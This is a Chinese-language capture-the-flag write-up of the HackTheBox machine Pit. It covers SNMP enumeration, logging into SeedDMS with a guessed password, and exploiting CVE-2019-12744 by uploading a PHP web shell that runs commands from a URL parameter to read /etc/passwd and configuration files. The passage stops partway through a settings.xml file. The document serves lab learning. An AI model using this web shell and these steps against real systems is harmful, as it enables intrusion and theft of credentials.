# Hackthebox-Pit靶机渗透笔记
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 目标IP：10.10.10.241
>
> 本机IP：10.10.16.12
## 前言
本文主要想记录一下对HackTheBox靶机Pit的渗透过程，涉及以下知识点：
1.snmp和snmpwalk工具使用
2.CVE-2019-12744
3.利用本地环境写入authorized_keys文件实现ssh免密登录root
难度中上，文中如果表述或者操作有问题欢迎各位师傅指出
## 信息收集
**nmap**
开放了22、80、9090端口，还是从80端口开始看
访问`10.10.10.241:80`只是个Nginx服务器搭建成功界面，没有可以利用的点
再看下9090端口，nmap扫出来一个`Zeus-admin?`去google一下，没有文章写的很清楚。
查看源码发现了有用信息
9090端口装了Cockpit
> Linux Cockpit 是一个基于Web 界面的应用，它提供了对系统的图形化管理。 … 它是一个用户友好的基于web
> 的控制台，提供了一些非常简单的方法来管理Linux 系统—— 通过web。 你可以通过一个非常简单的web
> 来监控系统资源、添加或删除帐户、监控系统使用情况、关闭系统以及执行其他一些其他任务。
在[exp库](https://www.exploit-db.com/)上看看有没有Cockpit的漏洞exp可利用，但是在源码中没有找到关于Cockpit的版本信息 暂时放一放
还找到了域名 **dms-pit.htb** 和 **pit.htb** 加入到`/etc/hosts`里方便解析域名
尝试用 **[Gobuster](https://github.com/OJ/gobuster)** 工具进行目录扫描，没有有用的发现
    gobuster dir -u http://dms-pit.htb/ -w /usr/share/wordlists/dirb/big.txt -t 200 --wildcard
做到这里我没思路了，nmap端口扫描的默认协议为TCP，实际上应该扫描一下UDP端口就有思路继续做下去了，还是经验不足吧
这里卡壳了去看了下官推给的提示
这个提示我自认为不是很明显，后来找了半天原来是snmpwalk的意思
>
> snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。通过snmpwalk也可以查看支持SNMP协议（可网管）的设备的一些其他信息，比如cisco交换机或路由器IP地址、内存使用率等，也可用来协助开发SNMP功能。
>
> 在日常监控中,经常会用到snmp服务,而snmpwalk命令则是采集系统各种信息最有效的方法。
**什么是snmp？**
> **SNMP** 是英文” **Simple Network Management Protocol** “的缩写，中文意思是”
> **简单网络管理协议** “。
> **SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。由于SNMP协议简单可靠
> ，受到了众多厂商的欢迎，成为了目前最为广泛的网管协议。**
>
> SNMP 和 UDP
>
> SNMP采用UDP协议在管理端和agent之间传输信息。 SNMP采用UDP
> 161端口接收和发送请求，162端口接收trap，执行SNMP的设备缺省都必须采用这些端口。SNMP消息全部通过UDP端口161接收，只有Trap信息采用UDP端口162。
那接下来我们应该就是通过snmpwalk得到某些信息继续做下去了
扫描发现161和162端口开放
通过[工具](https://github.com/dheiland-r7/snmp)从目标系统中提取SNMP数据
    snmpbw.pl target community timeout threads
得到`10.10.10.241.snmp`文件，从中发现
> Linux版本：Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64
>
> 很多目录
>
> username：michelle
搜一下seeddms，发现SeedDMS是个文档管理系统
访问`http://dms-pit.htb/seeddms51x/seeddms`
用`michelle`这个用户测试登录，简单测试了几个密码发现密码就是用户名，成功登录SeedDMS
其中发现了一个更新日志，管理员把SeedDMS的版本从5.1.10升级到了5.1.15，CHANGELOG中也显示最后的更新记录升级到了5.1.15版本，去[exp库](https://www.exploit-db.com/)看看有无可利用的漏洞
可能是官方设计的时候出了问题，整合目前可以得到的所有信息，这台机子的渗透已经做不下去了，如果真和更新日志里写的一样，5.1.15版本没有已知可用的exp。
看了几篇国外大佬的博客，做到这普遍存在一个疑问就是：日志中明确写到5.1.11版本修复了
CVE-2019-12744，为什么这里CVE-2019-12744的exp还是可以利用?
没办法，就当5.1.10版本继续做下去
## 漏洞利用
用CVE-2019-12744的exp可以实现 **远程命令执行**
**参链** ：
SeedDMS中进入 **michelle** 用户目录下添加`1.php`文档并上传本地的`backdoor.php`,内容如下
    //backdoor.php
    ";
            $cmd = ($_REQUEST['cmd']);
            system($cmd);
            echo "";
            die;
    }
    ?>
添加成功以后，看一下`1.php`的文档id(URL中可一看到document_id=xxx)，接下来可以通过cmd传参执行远程命令了
    http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd= 
    #我的1.php文档ID是30 
    #这里的“data”和“1048576”是保存上传文件的默认文件夹。
查看下`/etc/passwd`
浏览目录文件在`/var/www/html/seeddms51x/conf`目录下发现了配置文件`settings.xml`
    http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=ls /var/www/html/seeddms51x/conf
**settings.xml**
        <!-- enableGuestLogin: If you want anybody to login as guest, set the following line to true
           -                   note: guest login should be used only in a trusted environment